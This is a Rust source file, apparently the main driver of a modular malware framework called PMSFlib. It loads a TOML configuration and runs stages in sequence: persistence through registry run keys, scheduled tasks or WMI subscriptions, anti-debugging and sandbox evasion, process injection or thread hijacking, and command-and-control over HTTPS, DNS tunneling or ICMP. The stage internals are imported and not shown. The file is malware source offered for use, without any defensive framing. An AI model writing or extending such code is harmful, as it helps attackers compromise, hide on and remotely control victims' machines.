use PMSFlib::{
    establish_persistence_poly, perform_anti_analysis_poly, execute_code_poly, communicate_c2_poly, FrameworkConfig
};
use std::fs;

fn main() {
    // Load configuration file
    let config: Option<FrameworkConfig> = fs::read_to_string("config.toml")
        .ok()
        .and_then(|content| toml::from_str(&content).ok());
    println!("Loaded config: {:?}", config);

    // Helper closures for selecting implementations by name
    fn select_persistence(name: &str) -> Box<dyn PMSFlib::PersistenceStage> {
        match name {
            "RegistryRunKeys" => Box::new(PMSFlib::RegistryRunKeys),
            "ScheduledTasks" => Box::new(PMSFlib::ScheduledTasks),
            "WMIEventSubscription" => Box::new(PMSFlib::WMIEventSubscription),
            _ => establish_persistence_poly(),
        }
    }
    fn select_execution(name: &str) -> Box<dyn PMSFlib::ExecutionStage> {
        match name {
            "ClassicProcessInjection" => Box::new(PMSFlib::ClassicProcessInjection),
            "MappingInjection" => Box::new(PMSFlib::MappingInjection),
            "ThreadHijacking" => Box::new(PMSFlib::ThreadHijacking),
            "DirectSyscallExecution" => Box::new(PMSFlib::DirectSyscallExecution),
            _ => execute_code_poly(),
        }
    }
    fn select_c2(name: &str) -> Box<dyn PMSFlib::C2Stage> {
        match name {
            "HTTPSCommunication" => Box::new(PMSFlib::HTTPSCommunication),
            "DNSTunneling" => Box::new(PMSFlib::DNSTunneling),
            "ICMPCommunication" => Box::new(PMSFlib::ICMPCommunication),
            "RawSocketsCommunication" => Box::new(PMSFlib::RawSocketsCommunication),
            _ => communicate_c2_poly(),
        }
    }
    fn select_anti_analysis(name: &str) -> Box<dyn PMSFlib::AntiAnalysisStage> {
        match name {
            "AntiDebugging" => Box::new(PMSFlib::AntiDebugging),
            "VMDetection" => Box::new(PMSFlib::VMDetection),
            "SandboxEvasion" => Box::new(PMSFlib::SandboxEvasion),
            _ => perform_anti_analysis_poly(),
        }
    }

    let persistence = config.as_ref()
        .and_then(|c| c.persistence.as_deref())
        .map(select_persistence)
        .unwrap_or_else(establish_persistence_poly);
    println!("Selected persistence: {}", std::any::type_name_of_val(&*persistence));
    persistence.establish_persistence().unwrap();

    let anti_analysis = config.as_ref()
        .and_then(|c| c.anti_analysis.as_deref())
        .map(select_anti_analysis)
        .unwrap_or_else(perform_anti_analysis_poly);
    println!("Selected anti-analysis: {}", std::any::type_name_of_val(&*anti_analysis));
    anti_analysis.perform_anti_analysis().unwrap();

    let execution = config.as_ref()
        .and_then(|c| c.execution.as_deref())
        .map(select_execution)
        .unwrap_or_else(execute_code_poly);
    println!("Selected execution: {}", std::any::type_name_of_val(&*execution));
    execution.execute_code().unwrap();

    let c2 = config.as_ref()
        .and_then(|c| c.c2.as_deref())
        .map(select_c2)
        .unwrap_or_else(communicate_c2_poly);
    println!("Selected C2: {}", std::any::type_name_of_val(&*c2));
    c2.communicate_c2().unwrap();
} 